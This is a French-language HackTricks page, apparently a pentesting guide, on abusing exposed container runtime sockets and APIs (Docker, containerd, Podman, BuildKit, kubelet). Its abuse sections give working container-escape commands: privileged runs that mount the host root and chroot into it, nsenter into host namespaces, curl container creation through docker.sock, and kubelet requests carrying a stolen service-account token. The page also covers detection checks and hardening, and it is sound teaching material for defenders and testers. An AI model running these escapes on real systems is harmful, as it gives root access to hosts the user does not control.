# Exposition de Runtime API Et Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

De nombreuses compromissions réelles de containers ne commencent pas du tout par un namespace escape. Elles commencent par un accès au plan de contrôle du runtime. Si un workload peut parler à `dockerd`, `containerd`, CRI-O, Podman, ou kubelet via un Unix socket monté ou un écouteur TCP exposé, l'attaquant peut être en mesure de demander un nouveau container avec de meilleurs privilèges, monter le système de fichiers de l'hôte, rejoindre les namespaces de l'hôte, ou récupérer des informations sensibles du node. Dans ces cas, la runtime API est la véritable frontière de sécurité, et la compromettre revient fonctionnellement à compromettre l'hôte.

C'est pourquoi l'exposition des sockets du runtime doit être documentée séparément des protections du kernel. Un container avec un seccomp ordinaire, des capabilities, et un confinement MAC peut malgré tout n'être qu'à un appel d'API de la compromission de l'hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` y est monté. L'isolation du kernel du container actuel peut fonctionner exactement comme prévu tandis que le plan de gestion du runtime reste entièrement exposé.

## Modèles D'Accès Au Daemon

Docker Engine expose traditionnellement son API privilégiée via le Unix socket local à `unix:///var/run/docker.sock`. Historiquement, il a aussi été exposé à distance via des écouteurs TCP tels que `tcp://0.0.0.0:2375` ou un écouteur protégé par TLS sur `2376`. Exposer le daemon à distance sans TLS fort ni authentification client transforme effectivement la Docker API en interface root distante.

containerd, CRI-O, Podman, et kubelet exposent des surfaces similaires à fort impact. Les noms et les workflows diffèrent, mais pas la logique. Si l'interface permet à l'appelant de créer des workloads, monter des chemins de l'hôte, récupérer des credentials, ou modifier des containers en cours d'exécution, l'interface est un canal de gestion privilégié et doit être traitée comme tel.

Les chemins locaux courants à vérifier sont :
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Des stacks plus anciens ou plus spécialisés peuvent également exposer des endpoints tels que `dockershim.sock`, `frakti.sock`, ou `rktlet.sock`. Ceux-ci sont moins courants dans les environnements modernes, mais lorsqu’ils sont rencontrés, ils doivent être traités avec la même prudence car ils représentent des surfaces de contrôle du runtime plutôt que de simples sockets d’application.

## Secure Remote Access

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée avec TLS et de préférence avec authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L’habitude ancienne d’ouvrir le Docker daemon en HTTP clair par commodité est l’une des erreurs les plus dangereuses dans l’administration des containers, car la surface de l’API est suffisamment puissante pour créer directement des containers privilégiés.

Le schéma de configuration historique de Docker ressemblait à :
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sur les hôtes basés sur systemd, la communication du daemon peut aussi apparaître sous la forme `fd://`, ce qui signifie que le processus hérite d’un socket déjà ouvert par systemd au lieu de le binder directement lui-même. L’enseignement important n’est pas la syntaxe exacte, mais la conséquence de sécurité. Dès que le daemon écoute au-delà d’un socket local strictement protégé par des permissions, la sécurité du transport et l’authentification du client deviennent obligatoires plutôt qu’un durcissement optionnel.

## Abuse

Si un runtime socket est présent, confirme lequel c’est, s’il existe un client compatible, et si un accès brut HTTP ou gRPC est possible :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ces commandes sont utiles car elles permettent de distinguer un chemin mort, un socket monté mais inaccessible, et une API privilégiée active. Si le client réussit, la question suivante est de savoir si l’API peut lancer un nouveau container avec un host bind mount ou un partage de host namespace.

### When No Client Is Installed

L’absence de `docker`, `podman`, ou d’un autre CLI pratique ne signifie pas que le socket est sûr. Docker Engine parle HTTP via son Unix socket, et Podman expose à la fois une API compatible avec Docker et une API native Libpod via `podman system service`. Cela signifie qu’un environnement minimal avec seulement `curl` peut encore suffire à piloter le daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Cela compte pendant le post-exploitation parce que les defenders suppriment parfois les binaires client habituels mais laissent le management socket monté. Sur les hôtes Podman, remember that the high-value path differs between rootful and rootless deployments: `unix:///run/podman/podman.sock` pour les service instances rootful et `unix://$XDG_RUNTIME_DIR/podman/podman.sock` pour les rootless ones.

### Full Example: Docker Socket To Host Root

Si `docker.sock` est reachable, l'escape classique consiste à démarrer un nouveau container qui monte le host root filesystem puis à faire `chroot` dedans :
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Cela fournit une exécution directe en root sur l'hôte via le Docker daemon. L'impact ne se limite pas à la lecture de fichiers. Une fois à l'intérieur du nouveau container, l'attaquant peut modifier les fichiers de l'hôte, récupérer des credentials, implanter une persistence, ou lancer des workloads privilégiés supplémentaires.

### Full Example: Docker Socket To Host Namespaces

Si l'attaquant préfère entrer dans un namespace plutôt qu'un accès limité au filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ce chemin atteint l'hôte en demandant au runtime de créer un nouveau container avec une exposition explicite de l'host-namespace plutôt qu'en exploitant celui en cours.

### Full Example: containerd Socket

Un socket `containerd` monté est généralement tout aussi dangereux :
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Si un client plus proche de Docker est présent, `nerdctl` peut être plus pratique que `ctr` parce qu'il expose des flags familiers comme `--privileged`, `--pid=host` et `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
L'impact est encore une compromission de l'hôte. Même si les outils spécifiques à Docker sont absents, une autre runtime API peut quand même offrir le même pouvoir administratif. Sur les nœuds Kubernetes, `crictl` peut aussi suffire pour la reconnaissance et l'interaction avec les containers car il parle directement à l'endpoint CRI.

### BuildKit Socket

`buildkitd` est facile à manquer parce que les gens le considèrent souvent comme « juste le backend de build », mais le daemon reste un plan de contrôle privilégié. Un `buildkitd.sock` accessible peut permettre à un attaquant d'exécuter des build steps arbitraires, d'inspecter les capacités du worker, d'utiliser des local contexts depuis l'environnement compromis, et de demander des entitlements dangereux comme `network.host` ou `security.insecure` lorsque le daemon a été configuré pour les autoriser.

Les premières interactions utiles sont :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Si le daemon accepte les requêtes de build, testez si des entitlements insecure sont disponibles :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
L’impact exact dépend de la configuration du daemon, mais un service BuildKit rootful avec des entitlements permissifs n’est pas une simple commodité de développeur sans danger. Traitez-le comme une autre surface administrative à forte valeur, surtout sur les runners CI et les nœuds de build partagés.

### Kubelet API Over TCP

Le kubelet n’est pas un container runtime, mais il fait quand même partie du plan de gestion du node et se trouve souvent dans le même périmètre de confiance. Si le port sécurisé du kubelet `10250` est accessible depuis le workload, ou si des identifiants de node, des kubeconfigs, ou des droits de proxy sont exposés, l’attaquant peut être en mesure d’énumérer des Pods, récupérer des logs, ou exécuter des commandes dans des containers locaux au node sans jamais toucher au chemin d’admission du Kubernetes API server.

Commencez par une discovery peu coûteuse :
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Si le chemin proxy du kubelet ou de l'API-server autorise `exec`, un client capable de gérer WebSocket peut transformer cela en exécution de code dans d'autres conteneurs sur le nœud. C'est aussi pourquoi `nodes/proxy` avec seulement la permission `get` est plus dangereux qu'il n'y paraît : la requête peut toujours atteindre des endpoints kubelet qui exécutent des commandes, et ces interactions directes avec kubelet n'apparaissent pas dans les logs d'audit Kubernetes normaux.

## Checks

L'objectif de ces vérifications est de déterminer si le conteneur peut atteindre une quelconque management plane qui aurait dû rester en dehors de la trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Ce qui est intéressant ici :

- Un socket runtime monté est généralement une primitive administrative directe plutôt qu’une simple divulgation d’informations.
- Un listener TCP sur `2375` sans TLS doit être considéré comme une condition de compromission à distance.
- Des variables d’environnement comme `DOCKER_HOST` révèlent souvent que le workload a été conçu intentionnellement pour communiquer avec le runtime de l’hôte.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` écoute sur le socket local et le daemon est généralement rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | Aucun daemon privilégié de longue durée n’est requis pour un usage local ordinaire ; des sockets API peuvent néanmoins être exposés lorsque `podman system service` est activé | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | L’API administrative est exposée via le socket local et est généralement consommée par des outils de plus haut niveau | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | Le point de terminaison CRI est destiné aux composants de confiance locaux à la node | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Le kubelet ne devrait pas être largement accessible depuis les Pods ; l’accès peut exposer l’état des pods, des credentials et des fonctions d’exécution selon l’authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
